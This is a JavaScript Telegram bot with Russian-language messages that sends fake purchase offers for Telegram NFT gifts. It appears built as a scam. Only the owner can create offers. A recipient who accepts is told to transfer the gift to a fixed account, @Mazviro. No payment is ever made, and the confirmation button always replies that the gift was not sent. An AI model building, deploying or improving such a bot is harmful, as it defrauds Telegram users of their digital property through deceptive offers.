
import { InlineKeyboard } from "grammy";
import { randomBytes } from "node:crypto";

const OWNER_ID = 8855596552;
const RECEIVER = "@Mazviro";
const RECEIVER_URL = "https://t.me/Mazviro";

const offers = new Map();

function newId() {
  return randomBytes(6).toString("hex");
}

function parseGift(link) {
  try {
    const url = new URL(link);

    if (
      !["t.me", "telegram.me"].includes(
        url.hostname.toLowerCase()
      )
    ) return null;

    const match = url.pathname.match(
      /^\/nft\/([A-Za-z0-9_-]+)-(\d+)\/?$/
    );

    if (!match) return null;

    const name = match[1]
      .replace(/([a-z])([A-Z])/g, "$1 $2");

    return {
      url: `https://t.me/nft/${match[1]}-${match[2]}`,
      name: `${name} #${match[2]}`
    };
  } catch {
    return null;
  }
}

function offerKeyboard(id, giftUrl) {
  return new InlineKeyboard()
    .url("🎁 Посмотреть подарок", giftUrl)
    .row()
    .text("✅ Принять", `accept:${id}`)
    .text("❌ Отклонить", `reject:${id}`);
}

function acceptedKeyboard(id) {
  return new InlineKeyboard()
    .url("🎁 Открыть @Mazviro", RECEIVER_URL)
    .row()
    .text("✅ Я передал подарок", `sent:${id}`);
}

function offerText(offer) {
  return (
    "🎁 Предложение о покупке NFT\n\n" +
    `Покупатель предлагает ${offer.price} ⭐ ` +
    `за ${offer.gift.name}.\n\n` +
    `🔗 ${offer.gift.url}\n\n` +
    "⏳ Срок действия: 24 часа.\n\n" +
    "Выберите действие:"
  );
}

function acceptedText(offer) {
  return (
    "🎁 Предложение принято\n\n" +
    `Подарок: ${offer.gift.name}\n` +
    `Предложенная цена: ${offer.price} ⭐\n\n` +
    "Для продолжения откройте подарок " +
    "в Telegram и выберите передачу.\n\n" +
    `Получатель: ${RECEIVER}\n\n` +
    "Перед подтверждением передачи " +
    "проверьте условия сделки и получателя.\n\n" +
    "⚠️ Это предложение не является " +
    "подтверждением оплаты. " +
    "Бот не резервирует звёзды и " +
    "не гарантирует их получение."
  );
}

export function registerCommands(bot) {

  bot.command("start", async (ctx) => {
    await ctx.reply(
      "🎁 NFT Offers\n\n" +
      "Создание предложений о покупке " +
      "Telegram NFT-подарков.\n\n" +
      "Формат команды:\n" +
      "/offer ссылка цена\n\n" +
      "Пример:\n" +
      "/offer https://t.me/nft/MadPumpkin-3759 1200"
    );
  });

  bot.command("offer", async (ctx) => {
    if (ctx.chat.type !== "private") {
      return ctx.reply(
        "Команда доступна только в личных сообщениях."
      );
    }

    if (ctx.from.id !== OWNER_ID) {
      return ctx.reply(
        "❌ У вас нет доступа к созданию предложений."
      );
    }

    const parts = ctx.message.text.trim().split(/\s+/);

    if (parts.length !== 3) {
      return ctx.reply(
        "❌ Неверный формат команды.\n\n" +
        "Используйте:\n" +
        "/offer ссылка цена\n\n" +
        "Пример:\n" +
        "/offer https://t.me/nft/MadPumpkin-3759 1200"
      );
    }

    const gift = parseGift(parts[1]);
    const priceText = parts[2];

    if (!gift) {
      return ctx.reply(
        "❌ Некорректная ссылка на NFT.\n\n" +
        "Используйте ссылку вида:\n" +
        "https://t.me/nft/MadPumpkin-3759"
      );
    }

    if (!/^[1-9]\d*$/.test(priceText)) {
      return ctx.reply(
        "❌ Укажите положительное целое количество звёзд."
      );
    }

    const price = Number(priceText);

    if (
      !Number.isSafeInteger(price) ||
      price > 100000000
    ) {
      return ctx.reply(
        "❌ Недопустимая сумма предложения."
      );
    }

    const id = newId();

    const offer = {
      id,
      creatorId: ctx.from.id,
      gift,
      price,
      createdAt: Date.now(),
      expiresAt: Date.now() + 24 * 60 * 60 * 1000,
      status: "active",
      acceptedBy: null
    };

    offers.set(id, offer);

    await ctx.reply(
      offerText(offer),
      {
        reply_markup: offerKeyboard(id, gift.url),
        link_preview_options: {
          is_disabled: false
        }
      }
    );
  });

  bot.callbackQuery(/^accept:([a-f0-9]+)$/, async (ctx) => {
    const offer = offers.get(ctx.match[1]);

    if (!offer) {
      return ctx.answerCallbackQuery({
        text: "Предложение не найдено.",
        show_alert: true
      });
    }

    if (Date.now() > offer.expiresAt) {
      offer.status = "expired";

      return ctx.answerCallbackQuery({
        text: "Срок действия предложения истёк.",
        show_alert: true
      });
    }

    if (offer.status !== "active") {
      return ctx.answerCallbackQuery({
        text: "Предложение уже обработано.",
        show_alert: true
      });
    }

    offer.status = "accepted";
    offer.acceptedBy = ctx.from.id;

    await ctx.answerCallbackQuery({
      text: "Предложение принято.",
      show_alert: true
    });

    await ctx.reply(
      acceptedText(offer),
      {
        reply_markup: acceptedKeyboard(offer.id)
      }
    );
  });

  bot.callbackQuery(/^reject:([a-f0-9]+)$/, async (ctx) => {
    const offer = offers.get(ctx.match[1]);

    if (!offer) {
      return ctx.answerCallbackQuery({
        text: "Предложение не найдено.",
        show_alert: true
      });
    }

    if (offer.status !== "active") {
      return ctx.answerCallbackQuery({
        text: "Предложение уже обработано.",
        show_alert: true
      });
    }

    offer.status = "rejected";

    await ctx.answerCallbackQuery({
      text: "Предложение отклонено.",
      show_alert: true
    });

    await ctx.reply(
      `❌ Предложение по ${offer.gift.name} отклонено.`
    );
  });

  bot.callbackQuery(/^sent:([a-f0-9]+)$/, async (ctx) => {
    const offer = offers.get(ctx.match[1]);

    if (
      !offer ||
      offer.status !== "accepted" ||
      offer.acceptedBy !== ctx.from.id
    ) {
      return ctx.answerCallbackQuery({
        text: "Предложение недоступно.",
        show_alert: true
      });
    }

    // Проверка реального получения NFT
    // не подключена. Поэтому нельзя
    // подтверждать передачу по кнопке.
    return ctx.answerCallbackQuery({
      text: "❌ Вы не передали подарок.",
      show_alert: true
    });
  });
}

